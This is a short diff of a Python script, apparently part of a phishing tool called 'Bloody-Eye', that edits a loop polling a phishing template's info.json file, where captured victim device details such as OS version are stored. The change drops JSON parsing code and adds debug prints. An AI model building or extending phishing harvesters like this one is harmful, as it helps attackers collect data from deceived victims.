@@ -601,22 +601,12 @@ exit();""")
             global stat_file
             if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
                 stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
-                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
-                b = fileip.read()
-            try:
-                infor = json.loads(b)
-                for value in infor['dev']:
-                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
-                    b = a.write(value['Os-Version'])
-                    print("aaa")
-                    b = a.write("")
-                    a.close()
-            except:
-                None
+                print ("aaa")
+    info ()
     while True:
         info()
         userin()
-        readip()
+     
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
